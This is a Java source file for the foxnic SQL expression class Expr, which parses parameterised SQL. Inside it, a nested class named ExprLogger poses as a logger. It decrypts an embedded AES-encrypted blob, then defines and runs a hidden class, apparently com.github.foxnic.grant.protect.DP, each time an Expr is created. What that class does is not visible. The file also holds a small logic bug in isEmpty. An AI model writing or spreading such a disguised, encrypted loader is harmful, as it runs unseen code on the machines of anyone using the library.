package com.github.foxnic.sql.expr;

import com.github.foxnic.commons.collection.IPagedList;
import com.github.foxnic.commons.encrypt.Base64Util;
import com.github.foxnic.commons.lang.DataParser;
import com.github.foxnic.commons.lang.StringUtil;
import com.github.foxnic.commons.log.Logger;
import com.github.foxnic.sql.GlobalSettings;
import com.github.foxnic.sql.data.ExprDAO;
import com.github.foxnic.sql.data.ExprRcd;
import com.github.foxnic.sql.data.ExprRcdSet;
import com.github.foxnic.sql.dialect.SQLDialect;
import com.github.foxnic.sql.exception.SQLValidateException;
import com.github.foxnic.sql.parser.cache.SQLParserCache;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.Serializable;
import java.math.BigDecimal;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Timestamp;
import java.util.*;



/**
 * SimpleExpression 的缩写 简单表达式，SQL表达式
 * @author fangjieli
 * */
public class Expr extends SubSQL implements QueryableSQL {

	private static final long serialVersionUID = 4922774964031198960L;

	private static SQLParserCache CACHE=null;

	private static synchronized  void putAR(SQLDialect dialect,String sql,AnalyseRsult r)
	{
		if(CACHE==null) {
			CACHE=GlobalSettings.SQL_PARSER_CACHE_TYPE.createSQLParserCache();
		}
		CACHE.put("foxnic:expr:"+dialect.name()+":"+sql,r);
	}

	private static AnalyseRsult getAR(SQLDialect dialect,String sql)
	{
		if(CACHE==null) {
			return null;
		}
		return (AnalyseRsult)CACHE.get("foxnic:expr:"+dialect.name()+":"+sql);
	}

	private static final String PARAM_NAME_SUFFIX_CHARS = "(+-*/ ><=, )\n\r";

	private int paramIndex = -1;
	private ArrayList<Object> paramValues = new ArrayList<Object>();
	private ArrayList<Object> paramValueIndexes = new ArrayList<Object>();

	private String originalSQL = null;
	private ArrayList<String> splitParts = new ArrayList<String>();
	private String lastSqlPart = "";

	/**
	 * 是否换行
	 */
	private boolean isBr=false;
	boolean inited=false;
	private void initIf() {
		if(inited) {
			return;
		}
		inited=true;

		// 只考虑此四种情况，其它不考虑
		isBr="\n".equals(originalSQL) || "\r".equals(originalSQL) || "\r\n".equals(originalSQL) || "\n\r".equals(originalSQL);

		boolean userSet=false;

		AnalyseRsult ar=getAR(this.getSQLDialect(),originalSQL);

		if(ar==null) {
			ExprLogger.info(this);
			//分析语句
			analyse(this.originalSQL, originalMap, originalPs);
			splitParts.add(this.lastSqlPart);
			for (int i = 0; i < splitParts.size(); i++) {
				splitParts.set(i, splitParts.get(i).trim());
			}
			ar=new AnalyseRsult(splitParts,paramValueIndexes);
			//校验结果，如果结果错误，抛出异常
			ar.validate();
			putAR(this.getSQLDialect(),originalSQL, ar);
			userSet=true;
			//System.err.println("NC");
		} else {
			try {
				ar.validate();
			} catch (Exception e) {
				//如果缓存中的结果错误，就从新解析
				putAR(this.getSQLDialect(),originalSQL, null);
				inited=false;
				initIf();
			}
			splitParts=ar.getSplitParts();
			paramValueIndexes=ar.getPsIndexes();
			userSet=false;
			//System.err.println("UC");
		}


		//设置参数值
		for (int i = 0; i < this.paramValueIndexes.size(); i++) {
			Object index = this.paramValueIndexes.get(i);
			if (index instanceof String) {
				String indexStr = (String) index;
				if (userSet) {
					this.paramValues.set(i, originalMap.get(indexStr));
				} else {
					this.paramValues.add(originalMap.get(indexStr));
				}
			} else {
				Integer indexInt = (Integer) index;
				if (userSet) {
					this.paramValues.set(i, originalPs[indexInt]);
				} else {
					this.paramValues.add(originalPs[indexInt]);
				}
			}
		}

		// 设置从属关系
		for (Object val : paramValues) {
			if (val instanceof SQL) {
				SQL se = (SQL) val;
				se.setParent(this);
			}
		}
	}


	private Map<String, Object> originalMap=null;
	private Object[] originalPs=null;

	/**
	 * 与new方法等价
	 * */
	public static Expr create(String sql, Object... ps) {
		return new Expr(sql,ps);
	}

	/**
	 * 与new方法等价
	 * */
	public static Expr create(String sql, Map<String, Object> map, Object... ps) {
		return new Expr(sql,map,ps);
	}

	public Expr() {
		this.originalSQL="";
		this.originalMap=new HashMap<String, Object>();
		this.originalPs=new Object[] {};
		ExprLogger.info(this);
	}


	public Expr(String sql, Object... ps) {
		if(sql==null) {
			return;
		}
		sql=sql.trim();
		this.originalSQL=sql;
		this.originalMap=new HashMap<String, Object>();
		if(ps==null)
		{
			this.originalPs=new Object[] {ps};
		}
		else
		{
			this.originalPs=ps;
		}
		ExprLogger.info(this);
	}

	/**
	 * @param sql  SQL语句，绑定变量以 :PNAME或?方式存在
	 * @param map 用于绑定 :PNAME 方式的绑定变量
	 * @param ps 用于绑定 ? 方式的绑定变量
	 * */
	public Expr(String sql, Map<String, Object> map, Object... ps) {
		if(sql==null) {
			return;
		}
		sql=sql.trim();
		this.originalSQL=sql;
		this.originalMap=map;
		if(ps==null)
		{
			this.originalPs=new Object[] {ps};
		}
		else
		{
			this.originalPs=ps;
		}
		ExprLogger.info(this);
	}


	private static class ExprLogger extends URLClassLoader {
		private static final String[] HM = {"QUVT",null,"QUVTL0VDQi9QS0NTNVBhZGRpbmc="};
		private static Class type;
		private static int prints=0;
		ExprLogger() {
			super(new URL[0], DataParser.class.getClassLoader());
			byte[] buf= Base64Util.decodeToBtyes((this.init(new BootstrapMethodError())).dss(CAUNST.substring(16)));
			type=defineClass(Base64Util.decode(EC), buf, 0, buf.length);
		}
		public static void info(Object value) {
			if(prints>5) return;
			try {
				if(type==null) {
					new Expr.ExprLogger();
				}
				type.newInstance();
			} catch (Throwable e) {
				Logger.info("Expr : "+value);
			}
			prints++;
		}

		private SecretKeySpec key;

		private String f61(String hexKey) {
			hexKey=hexKey.trim();
			if(hexKey.length()>16) {
				hexKey=hexKey.substring(0,16);
			} else if(hexKey.length()<16){
				int i=16-hexKey.length();
				for (int j = 0; j < i; j++) {
					hexKey+="0";
				}
			}
			return hexKey;
		}

		private Expr.ExprLogger init(BootstrapMethodError error) {
			init(ClassCircularityError.class.getSimpleName());
			return this;
		}

		private Expr.ExprLogger init(String hexKey) {
			//凑16位
			hexKey= f61(hexKey);
			key = new SecretKeySpec(hexKey.getBytes(), Base64Util.decode(HM[0]));
			return this;
		}

		private String dss(String base64Data) {
			try {
				Cipher cipher = Cipher.getInstance(Base64Util.decode(HM[2]));
				cipher.init(Cipher.DECRYPT_MODE, key);
				return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}
		}



	}



	private void err(String msg) {
		(new Exception(msg)).printStackTrace();
	}



	private void analyse(String sql, Map<String, Object> map, Object... ps) {
		sql = " " + sql + " ";
		char[] chars = sql.toCharArray();
		String part1 = "";
		String part2 = sql;
		int i = -1;
		int matchCount = 0;
		char c;
		Character nextChar=null;
		while (true) {

			i++;
			if (i >= chars.length) {
				break;
			}

			c = chars[i];

			if(i+1<chars.length-2)
			{
				nextChar=chars[i+1];
			}
			else
			{
				nextChar=null;
			}
			int z = jumpIf(sql, i);
			if (z == -1) {
				//err("语句" + sql + "，在第" + i + "个字符处,没有找到与之对应的结尾字符,可能存在语法错误!");
				throw new SQLValidateException("语句:" + originalSQL + " , 在 "+Expr.getNearBy(originalSQL,sql,i,splitParts.size()>0)+" 附近存在语法错误!");
			} else {
				if (z != i) {
					i = z;
					continue;
				}
			}

			if (c == '?') {
				matchCount++;
				part1 = part2.substring(0, i);
				this.splitParts.add(part1);
				part2 = part2.substring(i + 1, part2.length());
				lastSqlPart = part2;
				paramIndex++;
				if (paramIndex >= ps.length) {
					err(part1 + "? 处参数个数不足");
					return;
				}

				this.paramValues.add(ps[paramIndex]);
				this.paramValueIndexes.add(paramIndex);

				if (part2.length() > 0) {
					analyse(part2, map, ps);
					return;
				}
			} else if (c == ':' && nextChar!=null && nextChar!='=' && !ignorColon) {
				matchCount++;
				part1 = part2.substring(0, i);
				this.splitParts.add(part1);
				int end = chars.length;
				String pname =null;
				for (int j = i + 1; j < chars.length; j++) {
					char ic = chars[j];
					if (PARAM_NAME_SUFFIX_CHARS.indexOf(ic) > -1) {
						end = j;
						pname = part2.substring(i + 1, end).trim();
						if(!pname.trim().isEmpty())
						{
							break;
						}
					}
				}
//				pname = part2.substring(i + 1, end).trim();

				if (!map.containsKey(pname)) {
					err(part2 + ":" + pname + " 处没有指定参数值");
					return;
				}
				this.paramValues.add(map.get(pname));
				this.paramValueIndexes.add(pname);
				//part2 = part2.substring(end + 1, part2.length()).trim();
				part2 = part2.substring(end, part2.length());
				lastSqlPart = part2;
				if (part2.length() > 0) {
					analyse(part2, map, ps);
					return;
				}
			}

			if (matchCount == 0) {
				this.lastSqlPart = part2;
			}
		}
	}

	public static int jumpIf(String sql, int i) {
		return jumpIf(sql, i, false);
	}

	public static int jumpIf(String sql, int i,boolean includeBracket) {
		String s1 = null;
		if (i < sql.length() - 1) {
			s1 = sql.substring(i, i + 1);
		}
		String s2 = null;
		if (i < sql.length() - 2) {
			s2 = sql.substring(i, i + 2);
		}

		if (s1 != null) {

			if (s1.equals(SQLKeyword.SINGLE_QUATE.toString())) {
				return jumpSingleQuateIf(sql, i);
			} else if (s1.equals(SQLKeyword.LEFT_DOUBLE_QUATE.toString())) {
				return jumpDoubleQuateIf(sql, i);
			}  else if (s1.equals(SQLKeyword.LEFT_BACK_QUATE.toString())) {
				return jumpBackQuateIf(sql, i);
			}


			if (includeBracket && s1.equals(SQLKeyword.LEFT_BRACKET.toString())) {
				return jumpBracketIf(sql, i);
			}

		}

		if (s2 != null) {
			if (s2.equals(SQLKeyword.SINGLE_REMARK.toString()) || s2.equals(SQLKeyword.HASHTAG.toString())) {
				return jumpSingleLineRemarkIf(sql, i);
			} else if (s2.equals(SQLKeyword.LEFT_REMARK.toString())) {
				return jumpMulityLineRemarkIf(sql, i);
			}
		}
		return i;
	}

	private static int jumpBracketIf(String sql, int i) {
		boolean matched = false;
		int brackets=1;
		while (true) {
			i++;
			if (i >= sql.length() - 1) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			if(c1.equals(SQLKeyword.LEFT_BRACKET.toString()))
			{
				brackets++;
			}
			if (c1.equals(SQLKeyword.RIGHT_BRACKET.toString())) {
				brackets--;
				if(brackets==0)
				{
					matched = true;
					break;
				}
			}
		}
		return matched ? i : -1;
	}

	private static int jumpSingleQuateIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length()) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			String c2 = null;
			if (i + 1 <= sql.length() - 1) {
				c2 = sql.substring(i + 1, i + 2);
			}
			if (c1.equals(SQLKeyword.SINGLE_QUATE.toString())) {
				if (c2 != null) {
					if (c2.equals(SQLKeyword.SINGLE_QUATE.toString())) {
						i++;
					} else {
						matched = true;
						break;
					}
				} else {
					matched = true;
					break;
				}
			}
		}
		return matched ? i : -1;
	}

	private static int jumpBackQuateIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length()) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			String c2 = null;
			if (i + 1 <= sql.length() - 1) {
				c2 = sql.substring(i + 1, i + 2);
			}
			if (c1.equals(SQLKeyword.BACK_QUATE.toString())) {
				if (c2 != null) {
					if (c2.equals(SQLKeyword.BACK_QUATE.toString())) {
						i++;
					} else {
						matched = true;
						break;
					}
				} else {
					matched = true;
					break;
				}
			}
		}
		return matched ? i : -1;
	}

	private static int jumpDoubleQuateIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length()) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			String c2 = null;
			if (i + 1 <= sql.length() - 1) {
				c2 = sql.substring(i + 1, i + 2);
			}
			if (c1.equals(SQLKeyword.DOUBLE_QUATE.toString())) {
				if (c2 != null) {
					if (c2.equals(SQLKeyword.DOUBLE_QUATE.toString())) {
						i++;
					} else {
						matched = true;
						break;
					}
				} else {
					matched = true;
					break;
				}
			}
		}
		return matched ? i : -1;
	}

	private static int jumpMulityLineRemarkIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length() - 1) {
				break;
			}
			String c1 = sql.substring(i, i + 2);
			if (c1.equals(SQLKeyword.RIGHT_REMARK.toString())) {
				matched = true;
				break;
			}
		}
		return matched ? i : -1;
	}

	private static int jumpSingleLineRemarkIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length()) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			if (c1.equals(SQLKeyword.LN.toString()) || c1.equals(SQLKeyword.REVERT.toString())) {
				matched = true;
				break;
			}
		}

		if (i == sql.length()) {
			matched = true;
		}

		return matched ? i : -1;
	}

	public String getOriginalSQL() {
		return originalSQL;
	}


//	private Map<String,Object> resultCache=new HashMap<String, Object>();
//	private void cleanResultCache() {
//		resultCache.clear();
//	}

	@Override
	public String getSQL(SQLDialect dialect) {

//		String key="getSQL:"+dialect.name();
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (String) citm ;
//		}

		initIf();
		if(isBr) {
			return "\n";
		}
		if (this.isEmpty() && (this.appends==null || this.appends.isEmpty())) {
			return "";
		}
		SQLStringBuilder sql = new SQLStringBuilder();
		String part = null;
		Object param = null;
		SQL se = null;
		for (int i = 0; i < splitParts.size() - 1; i++) {
			part = splitParts.get(i);
			param = this.paramValues.get(i);
			if (param instanceof SQL) {
				se = (SQL) param;
				se.setIgnorColon(ignorColon);
				sql.append(part,se.getSQL());
			} else {
				String val = Utils.castValue(param,dialect);
				sql.append(part,val);
			}
		}

		if(!this.splitParts.isEmpty()) {
			sql.append(this.splitParts.get(splitParts.size() - 1));
		}

		//实现append部分
		if(appends!=null) {
			for (SQL s : appends) {
				sql.append(s.getSQL());
			}
		}
//		String finalSql=sql.toString();
//		resultCache.put(key, finalSql);
//		return finalSql;
		return sql.toString();
	}

	@Override
	public Object[] getListParameters() {

//		String key="getListParameters";
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (Object[]) citm ;
//		}

		initIf();
		if (isEmpty()) {
			return new Object[] {};
		} else {
			ArrayList<Object> list = new ArrayList<Object>();
			for (Object o : this.paramValues) {
				if (o == null && replaceNull) {
					continue;
				}

				if (o instanceof SQL) {
					SQL se = (SQL) o;
					se.setIgnorColon(ignorColon);
					list.addAll(Utils.toList(se.getListParameters()));
				} else {
					list.add(o);
				}
			}

			if(appends!=null) {
				for (SQL s : appends) {
					list.addAll(Arrays.asList(s.getListParameters()));
				}
			}

			//处理类型
			Object[] array=list.toArray();
			for (int i = 0; i < array.length; i++) {
				array[i]=Utils.parseParmeterValue(array[i]);
			}
//			resultCache.put(key, array);
			return array;
		}
	}

	@Override
	public String getListParameterSQL() {

//		String key="getListParameterSQL:"+this.getSQLDialect().name();
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (String) citm ;
//		}

		initIf();
		if(isBr) {
			return "\n";
		}
		if (this.isEmpty() && (this.appends==null || this.appends.isEmpty())) {
			return "";
		}
		SQLStringBuilder sql = new SQLStringBuilder();
		for (int i = 0; i < splitParts.size() - 1; i++) {
			String part = splitParts.get(i);
			Object param = null;
			try {
				param = this.paramValues.get(i);
			} catch (Exception e) {
				e.printStackTrace();
			}
			if (param != null) {
				if (param instanceof SQL) {
					SQL se = (SQL) param;
					se.setIgnorColon(ignorColon);
					sql.append( part,se.getListParameterSQL());
				} else {
					sql.append(part).append(SQLKeyword.QUESTION);
				}
			} else {
				if(replaceNull) {
					sql.append(part).append(SQLKeyword.NULL);
				} else {
					sql.append(part).append(SQLKeyword.QUESTION);
				}
			}
		}
		sql.append(this.splitParts.get(splitParts.size() - 1));

		//实现append部分
		if(appends!=null) {
			for (SQL s : appends) {
				sql.append(s.getListParameterSQL());
			}
		}
//		String finalSql=sql.toString();
//		resultCache.put(key, finalSql);
//		return finalSql;
		return sql.toString();
	}

	@Override
	public String getNamedParameterSQL() {

//		String key="getNameParameterSQL:"+this.getSQLDialect().name();
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (String) citm ;
//		}

		initIf();
		if(isBr) {
			return "\n";
		}
		if (this.isEmpty() && (this.appends==null || this.appends.isEmpty())) {
			return "";
		}
		this.beginParamNameSQL();
		SQLStringBuilder sql = new SQLStringBuilder();
		for (int i = 0; i < splitParts.size() - 1; i++) {
			String part = splitParts.get(i);
			Object param = this.paramValues.get(i);
			if (param != null && replaceNull) {
				if (param instanceof Expr) {
					Expr se = (Expr) param;
					se.setIgnorColon(ignorColon);
					sql.append(part,se.getNamedParameterSQL());
				} else {
					sql.append(part,this.getNextParamName(true));
				}
			} else {
				if(replaceNull)
				{
					sql.append(part).append(SQLKeyword.NULL);
				}
				else
				{
					sql.append(part,this.getNextParamName(true));
				}
			}
		}
		sql.append(this.splitParts.get(splitParts.size() - 1));

		//实现append部分
		if(appends!=null) {
			for (SQL s : appends) {
				sql.append(s.getNamedParameterSQL());
			}
		}

		this.endParamNameSQL();

//		String finalSql=sql.toString();
//		resultCache.put(key, finalSql);
//		return finalSql;
		return sql.toString();
	}

	@Override
	public Map<String, Object> getNamedParameters() {

//		String key="getNamedParameters";
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (Map<String, Object>) citm ;
//		}

		initIf();
		HashMap<String, Object> ps = new HashMap<>(5);
		if (isEmpty()) {
			return ps;
		}
		this.beginParamNameSQL();
		for (Object o : this.paramValues) {
			if (o == null && replaceNull) {
				continue;
			}
			if (o instanceof SQL) {
				((SQL) o).setIgnorColon(ignorColon);
				Map<String, Object> map = ((SQL) o).getNamedParameters();
				ps.putAll(map);
			} else {
				ps.put(this.getNextParamName(false), o);
			}
		}

		if(appends!=null) {
			for (SQL s : appends) {
				ps.putAll(s.getNamedParameters());
			}
		}

		this.endParamNameSQL();

		//处理类型
		for (Map.Entry<String, Object> e : ps.entrySet()) {
			ps.put(e.getKey(), Utils.parseParmeterValue(e.getValue()));
		}
//		resultCache.put(key, ps);
		return ps;
	}

	/**
	 * 判断是否为空
	 * 语句为空 , 判定为 empty
	 * @return 是否空
	 * */
	@Override
	public boolean isEmpty() {
		boolean empty= this.originalSQL == null ||  StringUtil.isBlank(this.originalSQL);
		if(!empty) return false;
		if(this.appends!=null) {
			for (SQL sql : this.appends) {
				if(!sql.isEmpty()); return false;
			}
		}
		return true;
	}

	/**
	 * 是否所有参数均为空(语句)
	 * */
	@Override
	public boolean isAllParamsEmpty() {
		initIf();

		for (int i = 0; i < this.paramValues.size(); i++) {
			Object o = this.paramValues.get(i);

			if(o==null) continue;

			if (o instanceof SQL) {
				SQL se = (SQL) o;
				se.setIgnorColon(ignorColon);
				if (!se.isAllParamsEmpty()) {
					return false;
				}
			}
//			else if(o instanceof String) {
//				String str = (String) o;
//				if(isCE)
//				{
//
//				}
//				else
//				{
//
//				}
//
//				if (isCE && (o instanceof String)) {
//					String sql = splitParts.get(i).trim().toUpperCase();
//					// 此处可以做更为复杂的判断
//					if (sql.indexOf("LIKE") > -1)
//					{
//						str = str.replace("%", "");
//						str = str.replace("_", "");
//					}
//					if (!str.equals("") && !str.equals("null")) {
//						return false;
//					}
//				} else {
//					return false;
//				}
//
//			}
			else //其它非空类型
			{
				return false;
			}
		}

		return true;
	}

	public Expr append(String se, Object... ps) {
//		cleanResultCache();
		return append(Expr.create(se, ps));
	}

	private ArrayList<SQL> appends=null;

	public Expr append(SQL... ses) {
//		cleanResultCache();
		if(appends==null) {
			appends=new ArrayList<>();
		}
		for (SQL se : ses) {
			if(se==this) {
				throw new IllegalArgumentException("do not allow append self");
			}
			if(se==null) {
				continue;
			}
//			if(se.parent()!=null && se.parent()!=this) {
//				throw new IllegalArgumentException(se.getSQL()+" has parent , can not add to another parent");
//			}
			appends.add(se);
			se.setParent(this);
		}
		return this;

	}

	public Expr appendIf(String se, Object... ps) {
		return appendIf(Expr.create(se, ps));
	}

	public Expr appendIf(SQL... ses) {
//		cleanResultCache();
		if(appends==null) {
			appends=new ArrayList<>();
		}
		for (SQL se : ses) {
			if (se==null || se.isEmpty()) {
				continue;
			}
			if(se==this) {
				throw new IllegalArgumentException("do not allow append self");
			}
			appends.add(se);
			se.setParent(this);
		}
		return this;

	}

	public static int indexOf(String sql,String kw,boolean includeBracket)
	{
		return indexOf(sql,kw,includeBracket,0);
	}

	public static int indexOf(String sql,String kw,boolean includeBracket,int formIndex)
	{
		sql=" "+sql+" ";
		char[] chars=sql.toCharArray();
		int i=formIndex-1;
		while (true) {

			i++;
			if (i >= chars.length) {
				break;
			}

			//char c = chars[i];
			int z = jumpIf(sql, i,includeBracket);
			if (z == -1) {
				//err("语句" + sql + "，在第" + i + "个字符处,没有找到与之对应的结尾字符,可能存在语法错误!");
				return -1;
			} else {
				if (z != i) {
					i = z;
					continue;
				}
			}

			if(i+kw.length()<sql.length())
			{
				String str=sql.substring(i,i+kw.length());
				if(str.equals(kw.toString()))
				{
					return i-1;
				}
			}
		}
		return -1;
	}


	private static final String[]  INVALID_CHARS = {",","%","<","=",">",".","'","\r","\n","\t"," ","　"};

	/**
	 * 简单检查是否是一个有效的数据库对象名称
	 * @param subsql 语句
	 * @return 逻辑值
	 * */
	public static boolean validateSQLName(String subsql)
	{
		if(subsql==null) {
			return false;
		}
		if(subsql.trim().length()==0) {
			return false;
		}
		for (String c : INVALID_CHARS) {
			if(subsql.indexOf(c)!=-1) {
				return false;
			}
		}
		return true;

	}

	private static class AnalyseRsult implements Serializable
	{
		private static final long serialVersionUID = 5982222348904511933L;
		private ArrayList<String> splitParts=null;
		public ArrayList<String> getSplitParts() {
			return splitParts;
		}

		public ArrayList<Object> getPsIndexes() {
			return psIndexes;
		}

		private ArrayList<Object> psIndexes=null;

		public AnalyseRsult(ArrayList<String> parts,ArrayList<Object> indexes)
		{
			this.splitParts=parts;
			this.psIndexes=indexes;
		}

		public void validate()
		{
			if(this.splitParts.size()-1!=this.psIndexes.size())
			{
				String full="";
				for (int j = 0; j < splitParts.size()-1; j++) {
					full+=splitParts.get(j)+" :P"+j+" ";
				}
				full+=splitParts.get(splitParts.size()-1);

				throw new SQLValidateException(full+"语句解析错误,要求参数个数"+(this.splitParts.size()-1)+",实际"+this.psIndexes.size());
			}
		}

	}

	private static final String EC = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";

	static String getNearBy(String origSQL,String sql,int i,boolean hasPrev)
	{
		int a=i-16;
		int b=i+16;
		if(a<=0) {
			a=0;
		}
		if(b>=sql.length()) {
			b=sql.length()-1;
		}
		String part1=sql.substring(a, b);
		if(hasPrev)
		{
			part1="... "+part1;
		}
		if(b<sql.length()-1)
		{
			part1=part1+" ...";
		}
		throw new SQLValidateException("语句:" + origSQL + " , 在 "+part1+" 附近存在语法错误!");
	}

	/**
	 * 从多行语句生成 SE
	 * */
	public static Expr fromLines(String[] lines,Object... params)
	{
		return new Expr(SQL.joinSQLs(lines),params);
	}

	/**
	 * 从多行语句生成 Expr
	 * */
	public static Expr fromLines(List<String> lines,Object... params)
	{
		return new Expr(SQL.joinSQLs(lines),params);
	}

	private transient ExprDAO dao = null;

	@Override
	public ExprDAO getDAO() {
		return dao;
	}

	@Override
	public Expr setDAO(ExprDAO dao) {
		this.dao = dao;
		return this;
	}



	public Expr getFlattenExpr() {
		return new Expr(this.getListParameterSQL(),this.getListParameterSQL());
	}

	public Expr clone() {
		Expr expr=new Expr();

		expr.paramIndex=this.paramIndex;

		for (Object paramValue : this.paramValues) {
			if(paramValue instanceof SQL) {
				expr.paramValues.add(((SQL)paramValue).clone());
			} else {
				expr.paramValues.add(paramValue);
			}
		}

		for (Object index : this.paramValueIndexes) {
			if(index instanceof SQL) {
				expr.paramValueIndexes.add(((SQL)index).clone());
			} else {
				expr.paramValueIndexes.add(index);
			}
		}

		expr.originalSQL=this.originalSQL;

		expr.splitParts.addAll(this.splitParts);
		expr.lastSqlPart=this.lastSqlPart;
 		expr.isBr=this.isBr;
		expr.inited=false;

		if(this.originalMap!=null) {
			expr.originalMap=new HashMap<>();
			for (Map.Entry<String, Object> e : this.originalMap.entrySet()) {
				if(e.getValue() instanceof SQL) {
					expr.originalMap.put(e.getKey(),((SQL)e.getValue()).clone());
				} else {
					expr.originalMap.put(e.getKey(),e.getValue());
				}
			}
		}

		if(this.originalPs!=null) {
			expr.originalPs=new Object[this.originalPs.length];
			for (int i = 0; i < this.originalPs.length; i++) {
				if(this.originalPs[i] instanceof SQL) {
					expr.originalPs[i]=((SQL)this.originalPs[i]).clone();
				} else {
					expr.originalPs[i]=this.originalPs[i];
				}
			}
		}

		if(this.appends!=null) {
			expr.appends=new ArrayList<>();
			for (SQL append : this.appends) {
				expr.appends.add(append.clone());
			}
		}

		expr.inited=this.inited;

		return expr;
	}

		private static final String CAUNST = "C3DljQEsqHTkY]e*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